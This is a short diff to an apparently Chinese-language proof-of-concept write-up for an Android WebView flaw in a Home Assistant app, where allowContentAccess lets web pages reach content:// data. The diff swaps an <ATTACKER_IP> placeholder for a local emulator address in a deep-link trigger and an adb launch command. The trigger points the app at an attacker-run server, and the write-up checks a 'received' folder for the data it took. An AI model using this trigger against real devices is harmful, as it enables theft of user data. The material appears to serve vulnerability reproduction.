@@ -7,7 +7,7 @@ WebView 启用了 `allowContentAccess`，允许网页通过 `content://` 协议�
 ## 触发方式
 
 ```
-homeassistant://webview?url=http://<ATTACKER_IP>:8000/exp/2.1.2
+homeassistant://webview?url=http://10.0.2.2:8000/exp/2.1.2
 ```
 
 ## 启动服务
@@ -21,7 +21,7 @@ python server.py
 
 ```bash
 python server.py
-adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<本机IP>:8000/exp/2.1.2"
+adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/2.1.2"
 dir received\
 ```
 
